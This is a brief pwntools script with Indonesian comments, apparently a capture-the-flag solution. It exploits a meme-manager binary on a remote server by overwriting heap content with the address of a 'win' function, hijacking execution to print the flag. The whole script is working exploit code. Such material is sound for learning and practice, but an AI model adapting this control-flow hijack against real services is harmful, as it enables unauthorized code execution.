from pwn import *

#koneksi
#r = process('./ez') 
r = remote('128.199.157.172',23170)
#alamat target
ez_win = 0x4014a0 
def newMeme(size, content):
	r.sendlineafter("Choice: ", "1")
	r.sendlineafter("size: ", str(size))
	r.sendlineafter("content: ", content)
def editMeme(idx, content):
	r.sendlineafter("Choice: ", "2")
	r.sendlineafter("Index: ", str(idx))
	r.sendlineafter("content: ", content)
def printMeme(idx):
	r.sendlineafter("Choice: ", "3")
	r.sendlineafter("Index: ", str(idx))
	r.interactive()
#membuat meme baru
newMeme(1, "TEST1")
newMeme(2, "TEST2")
newMeme(3, "TEST3")
newMeme(4, "TEST4")
newMeme(5, "TEST5")
newMeme(6, "TEST6")
newMeme(7, "TEST7")
newMeme(8, "TEST8")
#overwrite content dengan alamat target 
editMeme(0, p64(ez_win)*5)
#menampilkan flag
printMeme(1)
